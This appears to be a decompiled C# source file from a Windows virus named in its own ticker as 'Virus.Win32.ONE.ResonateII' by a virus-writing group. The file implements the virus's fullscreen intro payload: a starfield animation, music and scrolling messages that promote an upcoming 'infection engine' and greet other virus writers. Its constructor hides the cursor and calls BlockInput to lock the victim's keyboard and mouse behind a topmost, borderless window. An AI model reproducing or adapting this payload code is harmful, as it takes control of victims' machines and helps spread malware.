using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using ResonateII.Properties;

namespace ResonateII;

public class intro : Form
{
	public struct star
	{
		public double x;

		public double y;

		public double z;

		public star(double xc, double yc, double zc)
		{
			x = xc;
			y = yc;
			z = zc;
		}
	}

	private const int sc = 256;

	private const int MAX_DEPTH = 32;

	private static string[] tickerms = new string[6] { "After months of development, I am pleased to present:", "ResonateII, the latest and coolest branch of the Galileo Project.", "Keep on the look out for the next virus using this Omnivorous iNfection Engine, coming soon to a forum near you.", "Greetz to: Toxoid_49b/GAiA, int7bh, foxxy, NO_BOOT_DEVICE, Mr. Dinkle, and SchrödingersCat", "Thanks to Mistejk for lots of help with unmanaged stuff.", "Virus.Win32.ONE.ResonateII, ©2016 justquant/GAiA" };

	private static int tickm = 0;

	private static double ticks = 0.0;

	public static star[] stars = new star[256];

	private IContainer components = null;

	private PictureBox canvas;

	private PictureBox logo;

	private Panel tickerpanel;

	private Label msg;

	private Timer tick;

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

	public static void initStars()
	{
		for (int i = 0; i < 256; i++)
		{
			stars[i] = new star(JLib.rollDice(50) - 25, JLib.rollDice(50) - 25, (int)JLib.rollDice(31));
		}
	}

	public intro()
	{
		InitializeComponent();
		FlanMOD.BASSMOD_Init(-1, 44100, BASSMOD_BASSInit.BASS_DEVICE_DEFAULT);
		FlanMOD.BASSMOD_MusicLoad(mem: true, Resources.final_countdown, 0, 0, BASSMOD_BassMusic.BASS_MUSIC_RAMP | BASSMOD_BassMusic.BASS_MUSIC_LOOP | BASSMOD_BassMusic.BASS_MUSIC_SURROUND2);
		FlanMOD.BASSMOD_MusicPlay();
		Cursor.Hide();
		BlockInput(fBlockIt: true);
		((Control)this).set_Width(Screen.get_PrimaryScreen().get_Bounds().Width);
		((Control)this).set_Height(Screen.get_PrimaryScreen().get_Bounds().Height);
		initStars();
		tick.Start();
		((Control)logo).set_Location(new Point(((Control)this).get_Width() / 2 - ((Control)logo).get_Width() / 2, ((Control)this).get_Height() / 2 - ((Control)logo).get_Height() / 2));
		((Control)msg).set_Location(new Point(((Control)this).get_Width() + 100, 5));
		((Control)tickerpanel).set_Size(new Size(((Control)this).get_Width(), ((Control)msg).get_Height() + 10));
		((Control)tickerpanel).set_Location(new Point(0, ((Control)this).get_Height() - ((Control)tickerpanel).get_Height()));
		((Control)msg).set_Text(tickerms[0]);
	}

	private void tick_Tick(object sender, EventArgs e)
	{
		ticks += 0.01;
		int red = (int)((Math.Sin(ticks) + 1.0) * 127.0) / 2;
		int blue = (int)((Math.Cos(ticks) + 1.0) * 127.0) / 2;
		int green = (int)((0.0 - (Math.Sin(ticks) - 1.0)) * 127.0) / 2;
		int red2 = (int)((Math.Sin(ticks) + 1.0) * 127.0) / 4;
		int blue2 = (int)((Math.Cos(ticks) + 1.0) * 127.0) / 4;
		int green2 = (int)((0.0 - (Math.Sin(ticks) - 1.0)) * 127.0) / 4;
		Color color = Color.FromArgb(red, green, blue);
		Color backColor = Color.FromArgb(red2, green2, blue2);
		rect(0, 0, ((Control)canvas).get_Width(), ((Control)canvas).get_Height(), color);
		((Control)logo).set_BackColor(color);
		((Control)tickerpanel).set_BackColor(backColor);
		((Control)msg).set_BackColor(backColor);
		((Control)msg).set_Location(new Point(((Control)msg).get_Location().X - 5, ((Control)msg).get_Location().Y));
		if (((Control)msg).get_Location().X < -((Control)msg).get_Width() - 10)
		{
			((Control)msg).set_Location(new Point(((Control)this).get_Width() + 100, ((Control)msg).get_Location().Y));
			tickm++;
			try
			{
				((Control)msg).set_Text(tickerms[tickm]);
			}
			catch
			{
				tickm = 0;
				((Control)msg).set_Text(tickerms[tickm]);
			}
		}
		for (int i = 0; i < 256; i++)
		{
			stars[i].z -= 0.2;
			if (stars[i].z <= 0.0)
			{
				stars[i].x = JLib.rollDice(50) - 25;
				stars[i].y = JLib.rollDice(50) - 25;
				stars[i].z = 32.0;
			}
			double num = 128.0 / stars[i].z;
			int num2 = (int)(stars[i].x * num + (double)(((Control)canvas).get_Width() / 2));
			int num3 = (int)(stars[i].y * num + (double)(((Control)canvas).get_Height() / 2));
			if (num2 >= 0 && num2 <= ((Control)canvas).get_Width() && num3 >= 0 && num3 <= ((Control)canvas).get_Height())
			{
				float num4 = (float)((1.0 - stars[i].z / 32.0) * 5.0);
				int num5 = (int)((1.0 - stars[i].z / 32.0) * 255.0);
				rect(num2, num3, num4, num4, Color.FromArgb(num5, num5, num5));
			}
		}
	}

	private void rect(int x1, int y1, float x2, float y2, Color c)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		Brush val = (Brush)new SolidBrush(c);
		Graphics val2 = ((Control)canvas).CreateGraphics();
		val2.FillRectangle(val, (float)x1, (float)y1, x2, y2);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		components = new Container();
		tickerpanel = new Panel();
		msg = new Label();
		logo = new PictureBox();
		canvas = new PictureBox();
		tick = new Timer(components);
		((Control)tickerpanel).SuspendLayout();
		((ISupportInitialize)logo).BeginInit();
		((ISupportInitialize)canvas).BeginInit();
		((Control)this).SuspendLayout();
		((Control)tickerpanel).get_Controls().Add((Control)(object)msg);
		((Control)tickerpanel).set_Location(new Point(13, 213));
		((Control)tickerpanel).set_Name("tickerpanel");
		((Control)tickerpanel).set_Size(new Size(200, 45));
		((Control)tickerpanel).set_TabIndex(2);
		((Control)msg).set_AutoSize(true);
		((Control)msg).set_Font(new Font("Lucida Console", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)msg).set_ForeColor(Color.White);
		((Control)msg).set_Location(new Point(18, 16));
		((Control)msg).set_Name("msg");
		((Control)msg).set_Size(new Size(336, 29));
		((Control)msg).set_TabIndex(2);
		((Control)msg).set_Text("the ticker is empty");
		logo.set_Image((Image)(object)Resources.logo);
		((Control)logo).set_Location(new Point(13, 13));
		((Control)logo).set_Name("logo");
		((Control)logo).set_Size(new Size(578, 168));
		logo.set_SizeMode((PictureBoxSizeMode)4);
		logo.set_TabIndex(1);
		logo.set_TabStop(false);
		((Control)canvas).set_Dock((DockStyle)5);
		((Control)canvas).set_Location(new Point(0, 0));
		((Control)canvas).set_Name("canvas");
		((Control)canvas).set_Size(new Size(932, 270));
		canvas.set_TabIndex(0);
		canvas.set_TabStop(false);
		tick.set_Interval(20);
		tick.add_Tick((EventHandler)tick_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(932, 270));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)tickerpanel);
		((Control)this).get_Controls().Add((Control)(object)logo);
		((Control)this).get_Controls().Add((Control)(object)canvas);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("intro");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Control)this).set_Text("intro");
		((Form)this).set_TopMost(true);
		((Control)tickerpanel).ResumeLayout(false);
		((Control)tickerpanel).PerformLayout();
		((ISupportInitialize)logo).EndInit();
		((ISupportInitialize)canvas).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
